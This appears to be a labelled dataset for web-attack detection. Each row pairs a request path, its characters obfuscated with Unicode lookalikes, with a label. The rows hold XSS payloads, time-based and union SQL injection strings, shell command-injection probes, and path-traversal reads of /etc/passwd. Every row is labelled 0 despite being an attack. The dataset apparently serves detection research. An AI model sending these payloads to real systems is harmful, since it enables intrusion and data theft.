sentences 	 labels
/  ?  < script > document . cookie =  " testqppc = 8767 ;  "  <  / script >  	 0
/ jа𑜆ascript / json . exe  	 0
/ 𝚢𝟴pmygrp . x ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝖘𝓽ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo jwnhuw )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 0
/ ԝ𝟰996nr0 . kspx ?  < meta http-equiv = set-cookie content =  " testttvs = 7163 "  >  	 0
/ 𝒔𝓉ring / strings / parameters = < object classid = clsid : ae24fdae-03c6-11d1-8b76-0080c744f389 >  < param name = url value = javascript : confirm ( document . location )  >  <  / object >  	 0
/ 𝐬𝕥ring / id = 1 & nombre =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & precio = 85 & cantidad = 78 & b1 = aadir + al + carrito  	 0
/ 𝖘𝑡ring / strings / parameters = 1 '  )  )  and  ( 7517 = 3423 )  * 3423 and  (  (  ' aenz '  =  ' aenz  	 0
/ 𝒔𝓉ring / strings / parameters = < layer + src =  " http :  /  / localhost "  >  	 0
/ 𝐞n-𝑢s / account / detail . asp ? nchannel =  ' 1  	 0
/ j𝙖ᴠascript / owa . exe  	 0
/ 𝘦𝕩amples / jsp / error / direct . php ? rf =  / etc / passwd \ x00  	 0
/ 𝓼𝓽ring / strings / parameters = 1 '  where 7910 = 7910 ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  	 0
/ 𐑈𝘵ring / strings / parameters = 1 '  )  )  )  union all select null , null , null , null , null , null #  	 0
/ 𝗵𝐭bin / pfdispaly . cgi ?  '  \ x0a / bin / cat  / etc / passwd |  '  	 0
/ n🯱𝖆fe1y6 . dll ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𐑈𝕥ring / strings / parameters = print (  ` echo etzhwz \ necho  $  (  ( 20 + 88 )  )  \ necho etzhwz \ necho etzhwz `  )  ;  /  / etzhwz  	 0
/ 𝘀𝒕ring / strings / parameters = ;  str =  $  ( echo rppevg )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 0
/ 𝕤𝙩ring / strings / parameters = & echo $ ifsninvio $  (  ( 20 + 74 )  )  $  ( echo $ ifsninvio ) ninvio \  	 0
/ ϲ𝘢cti / tinybrowser / upload . php ? badfiles = 1 >  < script > alert (  ' tinybrowser_multiple_xss . nasl '  )  <  / script >  	 0
/ 𝘴𝕥ring / id = bob @  < script > alert ( paros )  <  / script >  . parosproxy . org & nombre = jamn + ibrico & precio = 85 & cantidad = 80 & b1 = aadir + al + carrito  	 0
/ ꬵⅽgi-bin / echo ? foo =  < script > alert (  ' vulnerable '  )  <  / script >  	 0
/ ꜱ𝚝ring / str =  $  ( echo zdskke )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 0
/ 𝖾𝔵amples / servlets / servlet / jgs_portal_statistik . php ? meinaction = themen & month = 1 & year = 1 '  	 0
/ 𝘦𝘹amples / jsp / cal / viewcvs . cgi /  ? cvsroot =  < script > foo <  / script >  	 0
/ m𝒂𝑖n . php ? stuff =  "  & rm \ xa0q39243847 & rem \ xa0  	 0
/ 𝓼𝖙ring / strings / parameters = < a href =  "  \ x10javascript : javascript : alert ( 1 )  "  id =  " fuzzelement1 "  > test <  / a >  	 0
/ 𝓼𝓽ring / strings / parameters = x�? <  / title >  < img src = x onerror = confirm ( 1 )  >  	 0
/ 𐑈𝔱ring / strings / parameters = 1 )  as fxfe where 1148 = 1148 or  ( select  *  from  ( select ( sleep ( 5 )  )  ) sddo )  #  	 0
